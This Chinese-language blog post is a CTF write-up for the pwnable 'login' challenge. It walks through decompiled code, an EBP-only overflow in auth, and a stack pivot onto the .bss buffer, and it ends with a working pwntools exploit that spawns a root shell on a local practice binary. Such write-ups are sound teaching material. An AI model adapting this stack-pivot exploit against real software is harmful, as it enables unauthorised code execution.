---
layout: post
title: pwn pwnable login
excerpt: "pwnable login wirteup"
categories: [Writeup]
comments: true
---

这里用到栈转移技术

ida打开如下
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _BYTE *v4; // [sp+18h] [bp-28h]@1
  __int16 v5; // [sp+1Eh] [bp-22h]@1
  unsigned int v6; // [sp+3Ch] [bp-4h]@1

  memset(&v5, 0, 0x1Eu);                        // v5置零
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  printf("Authenticate : ");
  _isoc99_scanf("%30s", &v5);                   // 屏幕输入30字符到v5
  memset(&input, 0, 0xCu);                      // 置零
  v4 = 0;
  v6 = Base64Decode((int)&v5, &v4);             // v5进行解码
  if ( v6 > 014 )                               // v6>14则长度错误
  {
    puts("Wrong Length");
  }
  else
  {
    memcpy(&input, v4, v6);                     // 把v4复制到&input中,长度v6
    if ( auth(v6) == 1 )                        // md5校验,正确了就返回1
      correct();                                // 答对了直接开shell
  }
  return 0;
}
```

程序要求我们输入一个base64编码过的字符串，随后会进行解码并且复制到位于bss段的全局变量input中，最后使用auth函数进行验证，通过后进入带有后门的correct()打开shell

打开auth函数发现有栈溢出,offset为`8+4 = 12`
```c
_BOOL4 __cdecl auth(int a1)
{
  char v2; // [sp+14h] [bp-14h]@1
  char *s2; // [sp+1Ch] [bp-Ch]@1
  int v4; // [sp+20h] [bp-8h]@1

  memcpy(&v4, &input, a1);                      // input在bss上,用户控制a1,存在溢出
  s2 = (char *)calc_md5(&v2, 12);
  printf("hash : %s\n", s2);
  return strcmp("f87cd601aa7fedca99018a8be88eda34", s2) == 0;
}
```
调试发现不幸的是我们不能控制EIP，只能控制到EBP。这就需要用到stack pivot把对EBP的控制转化为对EIP的控制了。由于程序把解码后的输入复制到地址固定的`.bss`段上，且从auth到程序结束总共要经过auth和main两个函数的leave; retn。我们可以将栈劫持到保存有输入的.bss段上,结构如下
```
--------
new ebp |
--------|
new eip |两次leave,ret 之后,该地址的值为eip
--------|
.....   |
--------
```
而输入的内容是复制到`.bss`中的,所以payload在`stack`中如下

```
--------------
aaaa          |
--------------|
new eip       |
--------------|
point to .bss |
---------------
```
而输入的内容是复制到`.bss`中的,所以payload在`.bss`中如下
```
--------------
aaaa          | new ebp的值,无关紧要,所以aaaa
--------------|
new eip       | 两次leave,ret 之后,该地址的值为eip
--------------|
point to .bss |
---------------
```

最终的exp
```python
#!/usr/bin/python
#coding:utf-8

from pwn import *
from base64 import *

context.update(arch = 'i386', os = 'linux', timeout = 1)
io = process('./login')

payload = "aaaa"                #padding
payload += p32(0x08049284)      #system("/bin/sh")地址，整个payload被复制到bss上，栈劫持后retn时栈顶在这里
payload += p32(0x0811eb40)      #新的esp地址
io.sendline(b64encode(payload))
io.interactive()
```
结果
```python
python exp.py 
[+] Starting local process './login': pid 21958
[*] Switching to interactive mode
Authenticate : hash : 042095d730ded01465bcacae25f0b5ce
$ id
uid=0(root) gid=0(root) 组=0(root)

```